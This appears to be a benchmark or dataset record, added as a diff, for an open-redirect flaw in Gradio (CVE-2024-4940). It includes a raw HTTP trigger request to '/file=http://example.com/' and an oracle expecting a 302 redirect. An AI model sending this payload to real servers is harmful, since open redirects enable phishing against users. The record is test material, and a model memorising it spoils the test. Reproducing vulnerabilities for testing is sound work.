@@ -1,0 +1,15 @@
+{
+  "file_id": "343_gradio_huntr_35aaea93-6895-4f03-9c1b-cd992665aa60",
+  "numeric_id": "343",
+  "library_hint": "gradio",
+  "source": "huntr",
+  "title": "Open redirect vulnerability in Gradio due to improper validation of redirect URL parameter",
+  "cve": "CVE-2024-4940",
+  "cwe": "CWE-601: Open Redirect",
+  "library": "gradio",
+  "affected_version": "Latest",
+  "vulnerable_function": "N/A",
+  "triggerability": "direct",
+  "trigger_payload": "GET /file=http://example.com/ HTTP/1.1\nHost: {BASE_URL}\nsec-ch-ua:\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"\"\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, li\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: _ga_R1FN4KJKJH=GS1.1.1714449150.1.0.1714449150.0.0.0; _ga=GA1.1.1782003519.\nConnection: close",
+  "oracle": "Server responds with HTTP 302 Found and redirects to the specified URL (e.g., http://example.com/)"
+}
